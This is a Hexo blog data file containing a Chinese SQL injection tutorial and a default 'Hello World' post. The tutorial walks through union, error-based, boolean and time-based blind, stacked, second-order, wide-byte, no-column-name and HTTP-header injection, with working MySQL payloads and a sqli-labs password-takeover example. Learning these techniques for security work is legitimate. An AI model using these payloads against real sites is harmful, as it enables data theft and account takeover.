{"meta":{"title":"Hexo","subtitle":"","description":"","author":"caef11","url":"http://caef11.github.io","root":"/"},"pages":[],"posts":[{"title":"","slug":"sql小课题（基础版","date":"2023-01-21T10:18:06.958Z","updated":"2023-01-11T07:09:28.937Z","comments":true,"path":"2023/01/21/sql小课题（基础版/","link":"","permalink":"http://caef11.github.io/2023/01/21/sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88/","excerpt":"","text":"SQL注入课题​ by caef11 原理sql注入的原理可以从一整个sql查询语句看起 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;; 双引号内即是完整的查询语句，id是我们提交的内容，但实际上，我们提交的内容可以跳出这个单引号，或者是其他闭合符号来执行其他SQL语句。通常是攻击者构造恶意的SQL语句来欺骗有漏洞的网站，让恶意的SQL语句在数据库中被执行。 这里顺带可以解释一下万能密码。登录时的后端代码是 1$sql=&quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27; &quot;; 当我们在输入框中输入admin ‘ and 1&#x3D;1# 1$sql=&quot;SELECT * FROM users WHERE username=&#x27;admin&#x27; and 1=1 #&#x27; and password=&#x27;$password&#x27; &quot;; 其实最后执行的是 1$sql=&quot;SELECT * FROM users WHERE username=&#x27;admin&#x27; and 1=1&quot;; 返回为真就可以成功登录了，这算是非常典型的sql注入了。 information_schemainformation_schema 顾名思义就是一个信息库，是用来存储数据库的元数据（比如数据库，表的名称，列的数据类型或者访问权限等），在每个 MySQL 实例中，information_schema 保存了它维护的所有数据库的信息，这个库中包含了很多只读的表（它们实际上可看作为视图，因此并没有与之关联的文件，你也无法为它们创建触发器）。 这个库中最重要且在一般的注入中最常见的三张表就是schemata、tables、columns，这三张表中记录了库名表名字段名这几个我们select时要用到的信息。 常见大类联合注入联合注入的前提是要有回显，否则联合查询的查询结果得不到回显的话是无效的。联合注入要先判断判断注入点，主要是猜测原sql语句的闭合方式和是否存在漏洞。 一般来说检测注入分为两种类型：字符型和数字型。 字符型： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;; ?id&#x3D;1’ 会导致报错，在后面加一个%23或者#或者–+注释符后会正常显示 ?id&#x3D;1’ and 1&#x3D;1#回显正常 ?id&#x3D;1’ and 1&#x3D;2#报错。这就说明是字符型。当然，闭合符号不知有单引号还有” “|’’’ ‘’’|(‘ ‘)|(“ “)等等。 数字型: 1$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 就是没有闭合符号的字符型。 ?id&#x3D;1 and 1&#x3D;1 回显正常 ?id&#x3D;1 and 1&#x3D;2 报错。这样就是数字型。 随后就是查询列数。用order by 来查询表中有几个字段，一般都是猜解，列数为恰好报错的列数减一。当我们查询的字段只有3位时，order by x ，若x&gt;3则会产生报错，当x&#x3D;4时报错，&#x3D;3时不报错，可以得出查询的字段数量为3。 之后就要开始使用union，union意为联合，实际上就是联合两个select语句，将两个select的查询结果合并，这也是为什么通常前面一句select的查询要是空集，否则无论后面一个select怎么写，都会是前一句的查询结果，但是并不排除有要前一个select也成立的情况。因为前一个结果如果不理想，则会对后一个语句的回显造成影响。 拼接后基本上就是这样的格式： 1SELECT * FROM users where id=&#x27;1&#x27; union select 1,2,3 # &#x27; LIMIT 0,1; 报错注入一般来说常见的是三个函数：updatexml | floor | exp。 updatexml：这是一个替换函数。 updatexml(XML_document,XPath_string,new_value);” XML_document：String格式，为XML文档对象的名称， DocXPath_string：Xpath格式的字符串 new_value：String格式，替换查找到的符合条件的数据 concat()函数是将其连成一个字符串，然后~开头不是xml的语法，因此不会符合XPATH_string的格式，从而出现格式错误 然后报错会返回从开头到结尾（0x7e对应~） 1SELECT updatexml(1,concat(0x7e,(SELECT version()),0x7e),1); 注入举例 1?id=1&#x27;+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23 这边的+号会被转义成空格，%23是#的url编码，可以任意选择使用。 floor：floor本来是向下取整。 ​ floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或数执行后的结果。 ​ 主要是因为count()与group by联合使用时，会出现一个虚拟表，然后依次查询group by插入至一张含主键key，数量count的虚拟表中，按分组来插入，相同主键的数量+1； ​ floor(rand(0)*2)的值为011011 ，因为rand()在数据库中执行完成的速度更快。数据库运行命令时，首先在虚拟表中查询是否有相同的主键或分组，然后进行插入操作。 或者说： ​ (1)当我们查询floor(rand(0)*2)的值的第一位0时,发现虚拟表中没有0这个主键，然后准备新建主键|分 组操作，但是由于rand()函数特性(执行更快)，我们插入时发现0已经不存在了，因此我们插入第二位 值1。 ​ (2)第二位插入完后查询第三位1，发现主键中已经有1，因此主键1对应的数量count()+1。 ​ (3)查询第四位值0时，发现0在虚拟表中没有主键，因此再次执行新建主键|分组操作，但由于rand函 数特性，插入时发现0已经不存在，新建的分组|主键中插入第五位值1，因此产生主键冲突的报错。 ​ 简单来说，floor报错的原理是rand和order by或group by 的冲突。 需要用到以下函数： floor(x) &#x2F;&#x2F;向下取整，即取不大于x的最大整数。 rand(x) &#x2F;&#x2F;随机产生一个0-1之间的浮点数,当指定参数x之后，每次生成的值都是一样的,故称之为固定的伪随机数字(产生的数字都是可预知的)就比如rand(0) count(*) &#x2F;&#x2F;返回值的条目，与count()的区别在于其不排除NULL，count()如果统计到NULL,返回的结果即为NULL，返回列数。 group by &#x2F;&#x2F;分组的意思 完整语句： 1234select 1 from (select+count(*),concat(floor(rand(0)*2),database())a from information_schema.tables group by a)b;select 1 from (select+count(*),concat(floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))a from information_schema.tables group by a)b;select 1 from (select+count(*),concat(floor(rand(0)*2),(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1))a from information_schema.tables group by a)b;select 1 from (select+count(*),concat(floor(rand(0)*2),(select &#x27;password&#x27; from &#x27;users&#x27; limit 0,1))a from information_schema.tables group by a)b; 因为操作数应该至少包含一列，所以要加select 1 ，因为每个派生表都要又自己的别名，所以要加a和x。 exp：exp(n)本来的作用是返回e的n次方，所以exp报错是个溢出报错，利用溢出特性和双层嵌套查询，使数据库将错误信息返回，(数据库优先执行括号语句)这时，双层语句内部就会执行，但是它不会回退，所有就带着第一层语句+信息返回，达到我们目的 。 1and exp(~(select * from (select user())x)) # 本来其实是exp(n) n&gt;709的时候会造成溢出报错，不过这里也没有什么很大的关系。 https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/ 这篇文章里还有insert|update|delete时的exp报错利用。 extractvalue：extractvalue()本来用于返回目标xml中包含查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)concat:返回结果为连接参数产生的字符串。原理和updatexml其实是相同的。都是~不符合xml语法 1select * from test where id=1 and (extractvalue(1,concat(&#x27;~&#x27;,(select user()),&#x27;~&#x27;))); 以下比较冷门 geometrycollection（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); multipoint（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); polygon（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); multipolygon（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); linestring（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); multilinestring（5.5&lt;mysql版本&lt;5.6）： 1select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); 布尔注入布尔注入是一种盲注，是在不知道数据库返回值的情况下对内容进行猜测 123456Length() //返回字符串的长度Substr() //截取字符串Ascii() //返回字符的ascii码sleep(n) //将程序挂起一段时间 n为n秒if(expr1,expr2,expr3) //判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句limit m,n //表示从第m+1个数据开始，截取n条数据 主要是通过页面是否有报错来判断语句猜测是否正确。 可以通过F12开发者工具的网络来看执行时间。 查看是否存在注入点–&gt; 判断注入类型–&gt; 查看页面是否存在输出|是否存在报错提示–&gt; 判断数据库名长度–&gt;and length(database())&gt;猜测的长度 得到数据库库名–&gt;and ascii(substr(database(),1,1))&#x3D;猜测第一个的ASCII码 判断表的数量–&gt;and (select count(*) from information_schema.tables where table_schema&#x3D;’库名’)&gt;猜测的表的个数 依次判断表名的长度–&gt;and (length((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1)))&gt;猜测的表名长度 依次得到表名–&gt;and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1),1,1)))&#x3D;猜测的表名第一个字母的ASCII码 判断表中字段个数–&gt;and (select count(*) from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’)&gt;猜测的字段个数 依次判断表中字段名的长度–&gt;and (length((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1)))&gt;猜测的字段名的长度 依次判断表的字段名 –&gt; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1),1,1))&#x3D;猜测字段名第一个字母的ASCII码 依次判断字段中数据的长度–&gt;and (length((select 字段名 from 表名 limit 0,1)))&gt;猜测数据长度 依次得到字段中的数据–&gt;and ascii(substr((select 字段名 from 表名 limit 0,1 ),1,1)))&#x3D;猜测数据第一位ASCII码 延时注入也叫时间盲注，也就是通过语句执行的时间来判断语句是否执行正确。如果猜测正确，会导致执行的时间很长，如果猜测错误，会导致执行的时间很短。 判断站点是否存在回显|注入|错误提示 –&gt; 利用字符型|整数型判断 判断站点是否存在时间盲注 –&gt; 字符型：’ and sleep(5) %23 –&gt; 数字型：and sleep(5) %23 判断站点的数据库长度 –&gt; and if(length(database())&gt;7,sleep(5),1)) %23 判断站点的数据库名 –&gt; and if(ascii(substr(database(),1,1))&#x3D;100,sleep(5),1) %23 判断表的个数 –&gt; and if((select count(*) from information_schema.tables where table_schema&#x3D;’库名’)&#x3D;5,sleep(5),1) %23 依次判断表名长度 –&gt; and if(length((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1))&gt;5,sleep(5),1) %23 依次判断表名 –&gt; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’库名’ limit 0,1),1,1)),sleep(5),1) %23 依次判断表中的字段数量 –&gt; and if(select count(*) from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’&#x3D;猜测的字段个数,sleep(5),1) %23 依次判断表中的字段名长度 –&gt; and if(length((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1))&gt;5,sleep(5),1) %23 依次判断表中的字段名 –&gt; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’表名’ and table_schema&#x3D;’库名’ limit 0,1),1,1))&#x3D;猜测字段名第一个字母的ASCII码,sleep(5),1)%23 依次判断表中数据的长度 –&gt; and if((length((select 字段名 from 表名 limit 0,1)))&gt;猜测数据长度,sleep(5),1)%23 依次判断表中数据 –&gt; and if(ascii(substr((select 字段名 from 表名 limit 0,1),1,1))&#x3D;x,sleep(5),1)%23 进阶堆叠注入在sql语句中，分号为一个语句的结束，在一个语句结束后可以再继续添加语句，不同语句用分号隔开，造成堆叠注入。但是前提是存在注入漏洞，分号没有被过滤，没有禁止执行多条sql语句。其中mysqli_multi_query()这个函数就可以支持同时执行多条sql语句，而mysqli_query()函数一次只能执行一条语句。 二次注入二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。 防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 通俗一点的解释：用户输入数据–&gt;被防御者进行处理–&gt;再将数据存储至数据库中–&gt;数据恢复成本来的面貌–&gt;再次执行操作调用数据库中数据时，发生二次注入。 一般来说，是通过注册账号来对数据库进行数据的恶意插入，这时一定要注意对其中特殊字符的转义。然后再对插入的数据进行引用。当插入数据后，如果存在数据调用(看是否有数据显示在页面上)，再考虑是否存在二次注入。如果没有，则不存在二次注入。二次注入用例题来解释更加直观。如sqlilab中的less24。如果原来已知一个账号为caef11，密码未知，我们可以通过注册一个caef11’#的账号，并修改密码，来修改caef11的密码。 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 把后一个判断密码是否正确的语句直接过滤，此时caef11’#为账号,就会更改caef11的密码，而不是caef11’#的密码。 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;caef11&#x27;#&#x27;&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 宽字节注入在介绍宽字节注入之前，先来介绍一些中文编码。在GB2312编码方式中，一个汉字需要两个字节来表示。GB2312基本满足了计算机处理简体汉字的需求，所收录的汉字覆盖了99.75%的使用频率，但对于罕见字和繁体字，GB2312就不能处理了。因此发明了后来的GBK和GB18030。表示一个汉字的两个字节的第一个字节叫做高位（区字节），第二个字节叫做低位（位字节）。 为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义。magic_qutes_gpc函数在php中的作用是解析用户提交的数据，如有：post、get、cookie过来的数据增加转义符“\\” 以确保这些数据不会引起程序错误。当传递一个参数id&#x3D;1‘得时候，当我们输入这个单引号，会被认为是非法字符，会被过滤函数添加“\\”给过滤掉，所以我们想要程序接受我们传递得参数中包含单引号，那么就需要把这个转义字符“\\”干掉，那如何才能干掉呢？当http协议传输得时候，是要经过url编码的，如果这个编码完成后，传递到服务器时，我们可以在单引号前加上一个%df这样得编码，最后这样解码得时候，这个%df就会和“&#x2F;”对应得编码相结合按照gbk编码要求去解码，最后只剩下个单引号。 通俗解释：输入id&#x3D;1’ (参数不一定是id) –&gt; ’ 会被过滤函数添加 \\ 给过滤掉 不被过滤掉的方法就是去除 \\，但是前提有两个1.数据库查询设置为GBK编码（或者位字节的范围能表示\\的编码）2.使用了addslashes()，mysql_real_escape_string(),mysql_escape_string()之类的转义函数 前面说到在GB2312的编码方式中，是两个字节来表示一个汉字，\\经过url编码以后是%5c，既然是GBK编码，就可以在\\前面再加一个字节，组成一个汉字，那么原来的?id&#x3D;1’ –&gt;?id&#x3D;1\\ ‘ –&gt; ?id&#x3D;1%df%5c’ 这样%df%5c会被解析成一个汉字，单引号就不会被过滤了。 1?id =1%df&#x27; order by 3 %23 之后就可以进行正常的注入了。 无列名注入需要无列名注入主要是因为column关键字被ban，无法获取列名，光针对于这个还是比较简单的，不知道列名就可以利用给联合查询出来的派生表起别名就可以直接查出数据，如果想查出列名就可以用join using。 11&#x27; union select * from (select * from users a join users b)c# 然后就会报错出第一个字段然后就会爆出第二个字段username 11&#x27; union select * from (select * from users a join users b using(id,username))c# 直到爆出所有字段。 这里有一个意外发现，当你将users写成一个不存在的表名时，还会爆出库名 1select * from users where id=&#x27;1&#x27; union all select * from (select * from user as a join users as b)as c; 这个security便是库名。 这边再提一下order by盲注，也可用于无列名注入。因为order by是按照一列把表按0-9，a-z来排列 这样就可以一个字符一个字符来盲注 123select * from user where id=&#x27;id&#x27; union select 1,2,&#x27;o&#x27; order by 3;select * from user where id=&#x27;id&#x27; union select 1,2,&#x27;p&#x27; order by 3;select * from user where id=&#x27;id&#x27; union select 1,2,&#x27;q&#x27; order by 3; 当盲注正确的时候回显会发生变化，就可以确定第一位了。 还有子查询也可以用于无列名注入 1select `3` from (select 1,2,3 union select * from user)x; 相当于是给这个表取了一个1，2，3的别名，再通过别名来查询 1234select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from users)x;select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x;select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x; http头注入http请求报文内容 1.请求行：该部分包含了客户端的请求方式，请求资料名称，http协议版本号 2.请求头：该部分定义了超文本传输协议事务中的操作参数，可根据自己的需要定义内容 头部注入：一般获取头部等信息用于数据分析，但是通过请求头也可以向数据库发送查询信息，通过构造恶意的语句对数据库进行信息查询 3.请求体：该部分包含了页面所提交的参数。 关注页面中不太常见的关于useragent、referer、cookie等信息有没有在页面回显，即使没有回显也可以进行尝试，或者用sqlmap试着跑一下。 1$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; http头注入与上面的注入最大的不同还是在源代码上，因为通常来说useragent、referer、cookie等信息在数据库中不是select了，而是insert或者update，这就需要在闭合的时候小心一些，因为insert、update的数据个数有的时候不止一个，可以尝试a’ and … and ‘1’&#x3D;’1或者a’ or … or ‘这类来连接,不仅需要闭合这个单引号，还要保证整个句子能够执行。 useragent使服务器能够识别客户使用的操作系统以及版本，CPU类型，浏览器及版本等，网站常常通过判断UA来给不同的操作系统、不同的浏览器发送不同的页面，因此可能造成某些页面无法在某个浏览器中正常显示，但也可以通过改变UA绕过检测。 referer的作用是指示一个请求从哪里链接过来，注入方式和useragent是基本一样的。 cookie本身是一串加密过的数据，是网站为了辨别用户身份而存在在用户本地终端。用户使用浏览器第一次访问网站服务器时，网站服务器会返回给用户浏览器一段数据，浏览器将其保存到本地，以后用户使用浏览器每次再访问网站服务器时，请求都带着这个cookie来标名自己的用户身份。 cookie注入有两种方法，一种是sqlmap直接来跑出密文的加密值再用cmd5查表，还有一种是用burp截取报文手动删掉cookie进行闭合符号测试，或者用Google浏览器的cookie editor插件可以直接修改cookie。手动的话还是一样，要判断闭合符号，列数，有回显的位置，直接进行注入即可。 那就暂时先这样吧ovo。","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2023-01-21T04:39:28.211Z","updated":"2023-01-21T04:39:28.211Z","comments":true,"path":"2023/01/21/hello-world/","link":"","permalink":"http://caef11.github.io/2023/01/21/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}